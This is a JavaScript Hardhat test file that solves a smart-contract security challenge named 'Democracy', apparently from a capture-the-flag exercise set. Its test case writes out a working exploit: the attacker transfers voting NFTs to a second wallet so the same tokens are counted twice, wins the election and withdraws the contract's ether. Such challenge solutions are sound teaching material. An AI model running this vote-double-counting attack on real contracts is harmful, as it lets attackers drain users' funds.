const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet, attackerWorker] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        return { victimContract, attackerWallet, attackerWorker };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet, attackerWorker;

        before(async function () {
            ({ victimContract, attackerWallet, attackerWorker } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            // Nominate ourselves as challengers
            // We start at 5-3
            await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);

            // Transfer 1 to worker 0 so we only get 1 vote for ourselves and don't trigger an election
            await victimContract
                .connect(attackerWallet)
                .transferFrom(attackerWallet.address, attackerWorker.address, 0);
            // Now we're 5-4
            await victimContract.connect(attackerWallet).vote(attackerWallet.address);
            // Transfer the other NFT to worker
            await victimContract
                .connect(attackerWallet)
                .transferFrom(attackerWallet.address, attackerWorker.address, 1);
            // Since worker votes with a balance of 2, we get 2 votes, and now we're 5-6, triggering an election
            await victimContract.connect(attackerWorker).vote(attackerWallet.address);

            await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
